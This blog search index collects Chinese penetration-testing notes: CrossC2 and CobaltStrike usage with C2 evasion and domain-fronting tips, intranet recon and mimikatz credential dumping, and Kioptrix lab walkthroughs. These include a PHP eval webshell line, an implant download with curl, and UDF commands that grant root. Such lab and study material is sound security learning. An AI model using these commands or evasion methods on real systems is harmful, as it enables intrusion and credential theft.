<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>靶机-FristiLeaks1.3</title>
      <link href="/posts/2bd7fc7b.html"/>
      <url>/posts/2bd7fc7b.html</url>
      
        <content type="html"><![CDATA[<a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CrossC2</title>
      <link href="/posts/89b968f1.html"/>
      <url>/posts/89b968f1.html</url>
      
        <content type="html"><![CDATA[<p>CrossC2使用相关的笔记</p><a id="more"></a><p>关于CrossC2的使用要了解以下几点</p><ul><li>genCrossC2的genCrossC2.Win.exe和genCrossC2.Linux是指genCrossC2程序在对应操作系统下的可执行文件。</li><li>由genCrossC2生成的C2对应的具体操作系统平台，是在执行genCrossC2的时候指定的。</li><li>CrossC2.cna是放在客户端的，用来给CS添加CrossC2菜单。CrossC2.cna里面的$CC2_PATH.$CC2_BIN是genCross在teamServer操作系统下的路径，是实际生成C2的文件。</li></ul><p>一般用法（CS4.2+CrossC2）</p><p>在CS菜单中的CrossC2-&gt;Create CrossC2 Listener-&gt;Create Reverse http listener中生成命令，修改下粘贴到teamserver的主机上执行，生成C2 </p><p><code>python -m http.server 80</code> 起web</p><p>victim机下载 <code>curl -O http://xxx.xx.xxx.xx:80/CrossC2-test</code></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透</title>
      <link href="/posts/4e0a5250.html"/>
      <url>/posts/4e0a5250.html</url>
      
        <content type="html"><![CDATA[<p>小迪渗透内网部分的笔记</p><a id="more"></a><h4 id="windows内网信息收集"><a href="#windows内网信息收集" class="headerlink" title="windows内网信息收集"></a>windows内网信息收集</h4><ul><li>ipconfig /all 看主DNS后缀</li><li>net view /domain 判断存在域</li><li>net time /domain 判断主域</li><li>nslookup 域控名称 获取其 ip地址</li></ul><h4 id="默认常见用户身份"><a href="#默认常见用户身份" class="headerlink" title="默认常见用户身份"></a>默认常见用户身份</h4><ul><li>Domain Admins 域管理员</li><li>Domain Computers 域内机器</li><li>Domain Controllers 域控制器</li><li>Domain Guest 域访客</li><li>Domain User 域用户</li><li>Enterprise Admins 企业系统管理员</li></ul><h4 id="相关用户收集"><a href="#相关用户收集" class="headerlink" title="相关用户收集"></a>相关用户收集</h4><ul><li><p>whoami /all 用户权限</p></li><li><p>net config workstation 登陆信息</p></li><li><p>net user 本地用户</p></li><li><p>net localgroup 本地用户组</p></li><li><p>net user /domain 获取域用户信息</p></li><li><p>net group /domain 获取域用户组信息</p></li><li><p>wmic useraccount get /all 涉及域用户详细信息</p></li><li><p>net group “Domain Admins” /domain 查询域管理员账户</p></li><li><p>net group “Enterprise Admins” /domain 查询管理员用户组</p></li><li><p>net group “Domain Controllers” /domain 查询域控制器</p></li></ul><h4 id="凭据信息收集"><a href="#凭据信息收集" class="headerlink" title="凭据信息收集"></a>凭据信息收集</h4><h5 id="用户HASH，明文获取"><a href="#用户HASH，明文获取" class="headerlink" title="用户HASH，明文获取"></a>用户HASH，明文获取</h5><ul><li><p>mimikatz(win)</p><ul><li>privilege::debug</li><li>sekurlsa::logonpasswords</li></ul></li><li><p>mimipenguin(linux)</p></li></ul><h5 id="服务相关密码收集"><a href="#服务相关密码收集" class="headerlink" title="服务相关密码收集"></a>服务相关密码收集</h5><ul><li>LaZagne(all)</li><li>XenArmor(win)</li></ul><h5 id="Windows-WIFI密码"><a href="#Windows-WIFI密码" class="headerlink" title="Windows WIFI密码"></a>Windows WIFI密码</h5><ul><li>Netsh WLAN show profiles</li><li>netsh wlan show profiles name=”xxx” key=clear</li></ul><h4 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h4><p>域控制器名称及地址信息</p><ul><li>net time /domain nslookup ping</li></ul><p>域内存活主机地址及信息</p><ul><li><p>nbtscan 192.168.3.0/24 第三方工具（不推荐）</p></li><li><p>推荐自带命令</p><ul><li>for /L %I in(1,1,254) DO @ping -w 1 -n 1192.168.3.%I |findstr “TTL=”</li></ul></li><li><p>nmap masscan nishang（推荐） empire</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike学习笔记</title>
      <link href="/posts/f39c1fdc.html"/>
      <url>/posts/f39c1fdc.html</url>
      
        <content type="html"><![CDATA[<p>CS官方教程的学习笔记，目前进度到Weaponization。</p><a id="more"></a><h1 id="CobaltStrike-学习笔记"><a href="#CobaltStrike-学习笔记" class="headerlink" title="CobaltStrike 学习笔记"></a>CobaltStrike 学习笔记</h1><h2 id="1、Operations"><a href="#1、Operations" class="headerlink" title="1、Operations"></a>1、Operations</h2><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul><li>/sc   // show channel</li><li>neo: xxxxxxx //对neo说话</li><li>/msg neo xxxx //给neo发私信</li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>多个teamserver各司其职:<ul><li>staginig</li><li>post-ex</li><li>longhaul</li></ul></li><li>红队单元<ul><li>AccessManagementCell</li><li>TargetCell</li></ul></li><li>团队角色<ul><li>Access<ul><li>Get in and expand foothold</li></ul></li><li>Post Exploitation<ul><li>Data mining,monitor users,key log,etc.</li></ul></li><li>Local Access Manager<ul><li>Manage Callbacks</li><li>Setup Infrastructure</li><li>Persistence</li><li>Pass sessions to and from global access manager</li></ul></li></ul></li></ul><h2 id="2、Infrastructure"><a href="#2、Infrastructure" class="headerlink" title="2、Infrastructure"></a>2、Infrastructure</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="三种payload"><a href="#三种payload" class="headerlink" title="三种payload"></a>三种payload</h4><ul><li>egress //出网口payload</li><li>p2p //通过父payload通信</li><li>alias //对其它payload handler的引用</li></ul><p>也就是说,只要egress Beacon可以出网，p2p Beacon可以通过egress Beacon和teamserver通信</p><h4 id="Payload-Staging"><a href="#Payload-Staging" class="headerlink" title="Payload Staging"></a>Payload Staging</h4><ul><li><p>Stageless</p><ul><li>稳定</li></ul></li><li><p>Stager</p><ul><li>体积小、适用于资源有限的情况</li><li>较不安全</li><li>不稳定</li><li>更容易被AV发现</li></ul></li></ul><h4 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h4><ul><li>Payload controller<ul><li>MSF</li><li>CS //兼容MSF</li></ul></li><li>Staging protocal<ul><li>http</li><li>https</li><li>其它</li></ul></li></ul><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ol><li>Stager向Paylod controller发送http/https GET请求，并且URI的cheksum是一个固定值。</li><li>Payload controller校验请求后，响应一个位置独立的blob,在父程序内存中运行<ul><li>MSF:meterpreter payload</li><li>CS:beacon payload</li></ul></li></ol><ul><li>CS exp可以下载meterpreter payload，meterpreter exp也可以下载beacon payload</li></ul><h4 id="payload的行为"><a href="#payload的行为" class="headerlink" title="payload的行为"></a>payload的行为</h4><ul><li>间隔固定时间给teamserver发get请求，获取指令。</li><li>如果有指令，发送加密的指令。</li><li>如果是生成报告的指令，需要发送数据到teamserver，beacon会发送一个带有加密数据的post请求到。</li><li>以上只是默认设置，可以自己进行配置。</li></ul><h4 id="生成HTTPBeacon的参数"><a href="#生成HTTPBeacon的参数" class="headerlink" title="生成HTTPBeacon的参数"></a>生成HTTPBeacon的参数</h4><ul><li>HTTP Hosts                //home，域名，ip，ipv6都可以</li><li>HTTP Hosts(Stager) //Stager hosts（参考前面多个teamserver的思路）</li><li>HTTP Port(C2)          //beacon发请求的端口</li><li>HTTP Proxy               //beacon用的代理，甚至可以让beacon不用系统代理</li></ul><h4 id="HTTPS-Beacon"><a href="#HTTPS-Beacon" class="headerlink" title="HTTPS Beacon"></a>HTTPS Beacon</h4><ul><li>可以通过malleable C2 Profile配置一个可用的SSL 证书(非常推荐看下面的文档)<ul><li><a href="https://www.cobaltstrike.com/help-malleable-c2#validssl" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></li></ul></li></ul><h3 id="Redirectors"><a href="#Redirectors" class="headerlink" title="Redirectors"></a>Redirectors</h3><ul><li><p>可以迷惑对手，也可以负载均衡</p></li><li><p>可以用iptables,socat，apache或nginx反向代理，amazon cloudflare或者其他流量转发工具</p><ul><li><code>socat TCP4-LISTEN:80,fork TCP4:[team server]:80</code></li></ul></li></ul><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ul><li>用Redirector作为beacon的home host，和stager host</li><li>用CDN作为redirector(绝了，真没想到- -)</li></ul><h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><h4 id="用Socat作为转发器"><a href="#用Socat作为转发器" class="headerlink" title="用Socat作为转发器"></a>用Socat作为转发器</h4><ul><li>操作见教程，比较简单实用</li><li>实用screen，退出ssh的时候不会退出socat</li></ul><h4 id="用CDN作为转发器"><a href="#用CDN作为转发器" class="headerlink" title="用CDN作为转发器"></a>用CDN作为转发器</h4><ul><li><p>注意</p><ul><li>需要用有效的SSL证书</li><li>启用POST、GET</li><li>如果出现问题，可以在mellable C2 Profile改为 HTTP-GET only C2，即用GET请求回传数据</li><li>关闭CDN的缓存功能</li><li>注意有些CDN会修改请求，比如cloud front会改cookie里面的值的顺序，如果我们设置用cookie回传数据，就会出现问题。 </li></ul></li><li><p>域前置 domain fronting //太6了- -，不过好像一些CDN已经开始避免这种现象</p><ul><li>大概就是beacon请求a.com,HOST头写成b.com（CDN同时为a.com和b.com提供服务）</li><li>查DNS的时候查的是a.com,然后请求发到CDN</li><li>CDN收到http请求，会根据HOST头去请求b.com</li><li>防御方法就是检查URL和HOST,然后把HOST头改成URL里面的域</li><li>所以绕过防御的方法，就是用https（虽然CDN是MITM,也可以防御。但有个思路是，有些行业是不希望有MITM的，可以尝试）</li><li>还有一种防御方式，用SNI.也就是https在ssl层会提供的一个东西。</li></ul><h3 id="Server-Consolidation"><a href="#Server-Consolidation" class="headerlink" title="Server Consolidation"></a>Server Consolidation</h3><ul><li>HTTP Port(Bind)<ul><li>beacon的http请求先发到redirector的HTTP Port(C2)端口，再被转发到teamserver的HTTP Port(Bind)端口</li></ul></li></ul></li></ul><h3 id="DNS-Beacon"><a href="#DNS-Beacon" class="headerlink" title="DNS Beacon"></a>DNS Beacon</h3><ul><li>三种Channel<ul><li>dns<ul><li>A record (4 bytes/request)</li></ul></li><li>dns6<ul><li>AAAA record (16 bytes/request)</li></ul></li><li>dns-txt<ul><li>TXT record (189 bytes/request)</li></ul></li></ul></li><li>有些dns服务器会拒绝超长的域名查询，所以DNS Beacon作为备选的尝试</li></ul><h3 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h3><ul><li><p>named pip beacon</p></li><li><p>在windows上使用命名管道的时候，消息会自动封装在SMB协议中(445端口)，所以叫SMB Beacon</p></li><li><p>可以通过 link [host name] [pip],unlink [host] [pid]来主动连接，断开</p></li></ul><h3 id="TCP-Beacon"><a href="#TCP-Beacon" class="headerlink" title="TCP Beacon"></a>TCP Beacon</h3><ul><li>和SMB Beacon类似</li></ul><h3 id="External-C2"><a href="#External-C2" class="headerlink" title="External C2"></a>External C2</h3><ul><li>自己写程序，从beacon 获取数据，然后发给teamserver，反之亦然，其中可以自己进行处理。这个程序可以写多个，只要最终达成beacon和teamserver的通信就可以。</li><li>可以通过这个功能适配一些特殊环境<ul><li>比如可以通过与另一台电脑上的文件共享，来读写信息.</li><li><a href="https://labs.f-secure.com/archive/tasking-office-365-for-cobalt-strike-c2/" target="_blank" rel="noopener">另一种用法</a></li></ul></li></ul><h2 id="3、C2"><a href="#3、C2" class="headerlink" title="3、C2"></a>3、C2</h2><h3 id="Malleable-C2"><a href="#Malleable-C2" class="headerlink" title="Malleable C2"></a>Malleable C2</h3><p>修改各种配置，包括</p><ul><li>Network traffic</li><li>In-memory content,characteristics,and behavior</li><li>Process injection behavior</li></ul><h3 id="Profile-Components"><a href="#Profile-Components" class="headerlink" title="Profile Components"></a>Profile Components</h3><ul><li><p>Options</p><ul><li>set key “value”<ul><li>value 要用双引号</li></ul></li></ul></li><li><p>Blocks</p><ul><li>http-get{ indicators here }<ul><li>download tasks</li></ul></li><li>http-post{  indicators here }<ul><li>upload outputs</li></ul></li><li>http-stager{  indicators here }</li></ul></li><li><p>Extraneous Indicators</p><ul><li></li></ul></li><li><p>Transforms</p><ul><li><p>自定义如何处理,自定义如何传输（放在uri，post体，header等）,作者称之为基于用户定义和储存的加密通信</p></li><li><p>主要有以下几个部分</p><ul><li>http-get<ul><li>Client:metadata</li><li>Server:output</li></ul></li><li>http-post<ul><li>Client:id,output</li></ul></li><li>http-stager</li><li>http-config</li><li>https-certificate</li><li>stage</li><li>post-ex</li><li>process-inject</li><li>code-signer</li></ul></li></ul></li></ul><h4 id="Chunked-Output"><a href="#Chunked-Output" class="headerlink" title="Chunked Output"></a>Chunked Output</h4><ul><li>当不用print的时候，比如uri-append,parameter,header.会自动分块传输，以适应这些位置的大小。</li><li>http-post{ set verb “GET”},http-get{set verb “post”}</li></ul><h4 id="Profile-Variants"><a href="#Profile-Variants" class="headerlink" title="Profile Variants"></a>Profile Variants</h4><ul><li>http-get “variant naame”{ }</li></ul><p>Testing Profiles</p><ul><li>写好profile之后，用c2lint 进行单元测试</li><li>./c2lint [profile]</li></ul><h4 id="The-C2-Problem-Set"><a href="#The-C2-Problem-Set" class="headerlink" title="The C2 Problem Set"></a>The C2 Problem Set</h4><ul><li>不能出网</li><li>IOC（indicator of compromise）检测</li><li>我们的基础设施被标记为teamserver</li></ul><h4 id="HTTP-S-Proxy-Details"><a href="#HTTP-S-Proxy-Details" class="headerlink" title="HTTP/S Proxy Details"></a>HTTP/S Proxy Details</h4><ul><li><p>使用WinINet AIP</p><ul><li>自动使用用户代理（与IE相同），就算代理有用户名密码</li><li>如果代理失败，会自动提权</li></ul></li><li><p>我们自定义的代理信息会被存到beacon的某个位置，有暴露风险</p></li></ul><h4 id="Egress-amp-Network-Evasion"><a href="#Egress-amp-Network-Evasion" class="headerlink" title="Egress&amp;Network Evasion"></a>Egress&amp;Network Evasion</h4><ul><li>Profile Tips:<ul><li>Don’t use public malleable C2 profile examples in production</li><li>默认情况下的心跳是get请求，响应200，长度0 //非常可疑，尽量避免</li><li>http-stager //也非常重要，改变stager流量的样子<ul><li>推荐Header 改成不是 Content-type:application/octet-stream//因为这是默认项</li><li>推荐output 进行处理，因为stage数据开头的decoder有指定字节是固定的<ul><li>prepend一些数据</li></ul></li></ul></li><li>http-config，也改一改- -不然前功尽弃</li><li>Use plausible set useragent value for target network</li><li>if you are in a tough egress situation,可以考虑get-only C2</li></ul></li></ul><h4 id="Network-Security-Monitoring"><a href="#Network-Security-Monitoring" class="headerlink" title="Network Security Monitoring"></a>Network Security Monitoring</h4><ul><li>Use an Apache,Nginx,or a CDN as a redirector<ul><li>other benefits:<ul><li>smooths CS-specific indicators,better JA3S fingerprint</li><li>header的顺序，内容，更没有teamserver 的fingerprint</li></ul></li><li>Invest in your infrastructure<ul><li>Host redirectors on different providers</li><li>Domains are better with age and categorization</li><li>do not use IPv4 addresses for C2</li><li>Have a valid SSL certificate</li></ul></li><li>Operate “low and slow”<ul><li>High Beacon sleep interval</li></ul></li></ul></li></ul><h4 id="JA3"><a href="#JA3" class="headerlink" title="JA3"></a>JA3</h4><ul><li>A way of looking at the handshake process of tls traffic and generating a hash on the algorithms that both sides present to each other as potential key lenght and ciphers they can use to communicate.</li><li>And it turns out that these presented ciphers and key lengths aere agreat way to fingerprint the applications on each side of communication.</li><li>简单来说就是通过https双方协商好的cipher suite判断双方的程序，如果用Apache或Ngingx服务器作为redirector，jar3看起来就不是在和jdkxxx通信,而是apache或nginx</li></ul><h4 id="DNS-C2-Tracdecraft"><a href="#DNS-C2-Tracdecraft" class="headerlink" title="DNS C2 Tracdecraft"></a>DNS C2 Tracdecraft</h4><ul><li>Split-Split DNS<ul><li>Don’t use DNS C2</li></ul></li><li>Volume of requests<ul><li>Use DNS C2 as low&amp;slow fallback option only</li></ul></li><li>Bogon IP addresses<ul><li>Change dns idle in profile</li><li>Avoid ‘mode dns’ as this will send bogon responses</li></ul></li><li>Length of request hostnames and responses<ul><li>Set dns max txt to limit TXT length</li><li>Set maxdns to limit hostname length</li></ul></li></ul><h4 id="Infrastructure-OPSEC"><a href="#Infrastructure-OPSEC" class="headerlink" title="Infrastructure OPSEC"></a>Infrastructure OPSEC</h4><ul><li>How to find team servers on the internet<ul><li>Default(self-signed!)SSL certificate<ul><li>Use a valid SSL  certificate</li><li>Use Apache,Nginx,or a CDN as a redirector</li><li>Only allow HTTP/S connections from redirectors</li></ul></li><li>0.0.0.0 DNS response<ul><li>Set dns_idle in Malleable C2 to aviod 0.0.0.0</li></ul></li><li>Port 50050 open<ul><li>Firewalll port 50050 and access via SSH tunnel</li></ul></li><li>Empty index page,404,text/plain Content-Type<ul><li>Host content on your redirectors</li></ul></li><li>Don’t want your payload fconfig available to all?<ul><li>Set host_stage to false in Malleable C2</li><li>(disables hosted payload for staging purposes)</li></ul></li></ul></li><li>How to verify team server<ul><li>Connect to it and ask for a payload(staging)</li><li>wget -U “Internet Explorer” http://[server]/vl6D<ul><li>vl6D这个地方的checksum必须是某个固定的值</li></ul></li></ul></li></ul><h1 id="4、Weaponization"><a href="#4、Weaponization" class="headerlink" title="4、Weaponization"></a>4、Weaponization</h1><ul><li>执行自己想要执行的artifact:exe、dll、ps1</li><li>Static Analysis<ul><li>heuristics<ul><li>Compile time</li><li>Compiler</li><li>import table</li><li>metadata resources<ul><li>clone 其它程序的</li></ul></li><li>signed?</li><li>entropy</li></ul></li><li>correlation<ul><li>与样本库中的程序对比相似性</li></ul></li></ul></li><li>Dynamic Analysis<ul><li>sandbox<ul><li>TIME</li><li>INCOMPLETE</li></ul></li></ul></li><li>Artifact Kit<ul><li>Source code Framework to generate EXEs,DLLs and Serevice EXEs</li><li>Obfuscate known bad in unknown executable</li><li>Fool AV product to stop emulating executable</li><li>De-obfuscate known bad execute it</li></ul></li><li>Application Whitelisting<ul><li>prevent execution of unapproved applications</li><li>Run payload via whitelisted program<ul><li>MS Office Macro</li><li>PowerShell</li><li>LOLbins</li><li>DLL Sideloading</li></ul></li></ul></li></ul><ul><li>Resource Kit<ul><li>混淆web delivery后在victim上执行的命令</li></ul></li><li>In-memory Detections<ul><li>1:16s</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机-Kioptrix2014</title>
      <link href="/posts/48453.html"/>
      <url>/posts/48453.html</url>
      
        <content type="html"><![CDATA[<p>第五个靶机</p><a id="more"></a><p>nmap -sn 先找到ip地址192.168.2.179</p><p>先nmap看开了什么服务。先看基础服务有没有漏洞，再针对web测试</p><p><img src="/posts/48453/image-20220222142129618-164559688110713.png" alt="image-20220222142129618"></p><p>searchsploit apache 和 mod_ssl 都没有发现可用的exp</p><p>只开了80 和 8080</p><p>80只显示it works,8080 直接forbidden</p><p>80端口，按f12元素审查，发现有注释</p><p><img src="/posts/48453/image-20220222144354174-164559688110714.png" alt="image-20220222144354174"></p><p>访问</p><p><img src="/posts/48453/image-20220222144503631-164559688110715.png" alt="image-20220222144503631"></p><p>点击后发现是使用php画图的工具，下面是代码，上面是图。此时想找找有没有可以执行代码的类似example的地方。</p><p><img src="/posts/48453/image-20220222144613243-164559688110716.png" alt="image-20220222144613243"></p><p>没有发现容易利用的地方，去searchsploit一下pchart</p><p>发现2.1.3有exp</p><p><img src="/posts/48453/image-20220222145837729-164559688110717.png" alt="image-20220222145837729"></p><p>看路径</p><p><img src="/posts/48453/image-20220222145903145-164559688110718.png" alt="image-20220222145903145"></p><p>打开，pChart2.1.3的example中存在目录遍历</p><p><img src="/posts/48453/image-20220222153605714-164559688110719.png" alt="image-20220222153605714"></p><p>在网页中尝试一下</p><p><img src="/posts/48453/image-20220222153704788-164559688110720.png" alt="image-20220222153704788"></p><p>既然可以读文件，读一下敏感文件</p><p>/etc/motd 发现操作系统是FreeBSD 9.0,有两个可用的提权exp</p><p><img src="/posts/48453/image-20220222162700728-164559688110721.png" alt="image-20220222162700728"></p><p>有php.ini</p><p>在搜索的过程中发现,phpinfo结合文件包含可以getshell（意外收获</p><p>然而php.ini并不可以，因为利用需要phpinfo动态打印出的$_FILES的值。</p><p>既然8080端口是403，可以看下配置文件，为什么403</p><p>在<a href="https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout" target="_blank" rel="noopener">这里</a>有各种系统下apache配置文件的位置</p><p>其实前面fuzz敏感文件的时候，应该fuzz出来，现在把这个路径加到字典里面了。</p><p><img src="/posts/48453/image-20220222174917986-164559688110722.png" alt="image-20220222174917986"></p><p>在<a href="https://httpd.apache.org/docs/2.2/mod/mod_authz_host.html" target="_blank" rel="noopener">这里</a>看到是要存在名为Mozilla4_browser的环境变量，而Mozilla4_browser的含义由前面的SetEnvIf定义。</p><p>可以看到 User-Agent要是 <code>^Mozilla/4.0</code>这里是正则，意思是以Mozilla/4.0开头都行</p><p>进来之后是phptax</p><p><img src="/posts/48453/image-20220222175419964-164559688110723.png" alt="image-20220222175419964"></p><p>searchsploit发现有RCE的exp</p><p>尝试了下nc正连连不上，反连可以连回来，可以执行命令但没有回显</p><p><img src="/posts/48453/image-20220223104057040-164559688110724.png" alt="image-20220223104057040"></p><p>那就写个webshell</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs echo%20'<?php%20eval($_GET[" pass"]);'%20>a.php```"><br>![image-20220223121905427](靶机-Kioptrix2014&#x2F;image-20220223121905427-164559688110725.png)<br><br>可以有回显地执行命令了<br><br>which nc,有nc<br><br>![image-20220223131034299](靶机-Kioptrix2014&#x2F;image-20220223131034299-164559688110726.png)<br><br>直接nc -e ，不行<br><br>man nc，看下<br><br>![image-20220223132353512](靶机-Kioptrix2014&#x2F;image-20220223132353512-164559688110727.png)<br><br>这用法好像不太一样<br><br>用nc 加 重定向，把[php_reverse_shell](https:&#x2F;&#x2F;github.com&#x2F;pentestmonkey&#x2F;php-reverse-shell)传过去，访问，拿到shell<br><br>![image-20220223133328058](靶机-Kioptrix2014&#x2F;image-20220223133328058-164559688110728.png)<br><br>用户是www<br><br>用前面的FreeBSD9.0提权exp：<br><br>先nc+重定向把xx.c传上去<br><br>gcc xx.c<br><br>.&#x2F;a.out<br><br>提权成功<br><br>![image-20220223134525998](靶机-Kioptrix2014&#x2F;image-20220223134525998-164559688110729.png)<br><br>到这里应该结束了，偶然看到带一篇文章，现在执行passwd会报错。<br><br>&#96;&#96;&#96;echo sshd_enable&#x3D;&quot;YES&quot; &gt;&gt; &#x2F;etc&#x2F;rc.conf<br></code></pre></td></tr></table></figure><figure class="hljs highlight plain"><figcaption><span>start```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs /etc/rc.d/sshd"><br>&#96;&#96;&#96;add user xxx<br></code></pre></td></tr></table></figure><p>然后再用添加的用户ssh，再提权，就可以改root密码了。</p><p><img src="/posts/48453/image-20220223135620575-164559688110730.png" alt="image-20220223135620575"></p><p>最后</p><p><img src="/posts/48453/image-20220223135731201-164559688110731.png" alt="image-20220223135731201"></p><h5 id="总结下思路"><a href="#总结下思路" class="headerlink" title="总结下思路"></a>总结下思路</h5><p>元素审查发现url</p><p>目录遍历读取apache文件，了解到403站点的规则</p><p>通过无回显命令执行漏洞写webshell到有回显</p><p>通过webshell使用nc+重定向上传php_reverse_shell</p><p>提权后创建新用户，开启ssh使用新用户登陆后再提权</p><h5 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h5><p>php_reverse_shell</p><p>phpinfo+文件包含</p><p>FreeBSD下apache配置文件的路径加入字典</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机-KioptrixLevel1.3(#4)</title>
      <link href="/posts/31832.html"/>
      <url>/posts/31832.html</url>
      
        <content type="html"><![CDATA[<p>Kioptrix系列的靶机，第四个。</p><a id="more"></a><p>先用namp扫一下</p><p><img src="/posts/31832/1.png" alt></p><p>可以看到有ssh，http，samba。</p><p>用searchSploit 分别搜索对应版本漏洞。</p><p><img src="/posts/31832/2.png" alt></p><p>Apache看到一条符合的。</p><p>搜索了一下，发现是.htaccess配置文件中的内容不符合规则时，服务器响应头的Allow字段会泄露部分内存的信息。</p><p><img src="/posts/31832/3.png" alt></p><p>尝试了一下，并没有触发。</p><p>Samba 3.X-4.X有很多漏洞，依次试一下。 <img src="/posts/31832/4.png" alt="image-20210630101730152"></p><p>尝试了usermap_script，没有成功</p><p><img src="/posts/31832/5.png" alt></p><p>尝试第二个的时候发现了samaba的具体版本，searchsploit中并没有合适的exp</p><p><img src="/posts/31832/6.png" alt="image-20210630144108546"></p><p>看Web，直接进入后是登陆页面。抓包，sqlmap跑找到密码字段是注入点。</p><p><img src="/posts/31832/7.png" alt="image-20210630145530293"></p><p>得到两个帐号密码</p><p>尝试ssh登陆</p><p><img src="/posts/31832/8.png" alt="image-20210630145749013"></p><p>emm- -</p><p><img src="/posts/31832/9.png" alt="image-20210630150000640"></p><p>另一个也是同样的</p><p><img src="/posts/31832/10.png" alt="image-20210630150205313"></p><p>感觉没什么用。</p><p>登陆web试试</p><p><img src="/posts/31832/11.png" alt="image-20210630150633387"></p><p><img src="/posts/31832/12.png" alt="image-20210630150835110"></p><p>继续用sqlmap跑mysql库的user表,跑出1个密文密码</p><p><img src="/posts/31832/13.png" alt="image-20210630220731576"></p><p>除了*号是是40位</p><p>dirb爆破目录。</p><p><img src="/posts/31832/14.png" alt="image-20210630223240177"></p><p>john目录下有个john.php但是没法看到其中内容，访问会被重定向到index</p><p>到这里没什么思路了。于是搜索了下。</p><p>发现可以通过echo os.system(‘/bin/bash’)来逃逸受限shell，之后提权。</p><p>经过搜索，使用udf提权。</p><p>在john的shell里跑了一下linpeass.sh</p><p><img src="/posts/31832/15.png" alt="image-20210705095435875"></p><p>发现系统中有对应的so</p><p>登陆mysql，<code>select * from mysql.func</code></p><p><img src="/posts/31832/16.png" alt="image-20210705102825322"></p><p>发现已经导入过了</p><p>直接 <code>select sys_exec(&#39;chmod u+s /bin/bash&#39;)</code></p><p>或者<code>select sys_exec(&#39;echo &quot;john ALL=(ALL) NOPASSWD: ALL &gt;&gt; /etc/sudoers&quot;&#39;)</code></p><p>获得root权限</p><h4 id="获得新技能"><a href="#获得新技能" class="headerlink" title="获得新技能"></a>获得新技能</h4><ul><li><p>smbclient -L xxxxx -N 获取Samba版本号</p></li><li><p>echo os.system绕过命令限制</p></li><li><p>sqlmap读文件 –file-read=/bin/kshell</p></li><li><p>getconf LONG_BIT 获取系统位数</p></li><li><p>mysql UDF</p></li></ul><h4 id="获得新思路"><a href="#获得新思路" class="headerlink" title="获得新思路"></a>获得新思路</h4><ul><li>echo $PATH 查看环境变量</li><li>echo $SHELL查看用的什么shell</li><li>ps -ef 看mysql是否以root权限运行，考虑mysql提权</li></ul><h4 id="获得新工具"><a href="#获得新工具" class="headerlink" title="获得新工具"></a>获得新工具</h4><ul><li>目录扫描工具gobuster</li><li>目录扫描工具dirsearch</li></ul><h4 id="另一种拿shell方式"><a href="#另一种拿shell方式" class="headerlink" title="另一种拿shell方式"></a>另一种拿shell方式</h4><p>前面登陆后到这个页面就没思路了。但其实忘记了测试这条url</p><p><img src="/posts/31832/17.png" alt="image-20210630150633387"></p><p>对此时的url进行fuzz测试，当username不存在时会报错，如下</p><p><img src="/posts/31832/18.png" alt="image-20210705170603944"></p><p>继续测试修改username=/etc/passwd,发现做了过滤</p><p><img src="/posts/31832/19.png" alt="image-20210705170842448"></p><p>双写绕过</p><p><img src="/posts/31832/10.png" alt="image-20210705171116357"></p><p>发现代码逻辑是username/username.php</p><p>php版本是5.2.4&lt;5.3.4,可以用%00截断（NUL meta character）</p><p><img src="/posts/31832/21.png" alt="image-20210705171438641"></p><p>读到了东西</p><p>试了下远程包含</p><p><img src="/posts/31832/22.png" alt="image-20210705171641879"></p><p>不行，试了php://input也不行。</p><p>继续本地文件包含</p><p>读取一下当前进程的信息</p><p><img src="/posts/31832/23.png" alt="image-20210706082431749"></p><p>读取当前进程的cmdline</p><p><img src="/posts/31832/24.png" alt="image-20210706083652199"></p><p>枚举文件描述符</p><p><img src="/posts/31832/25.png" 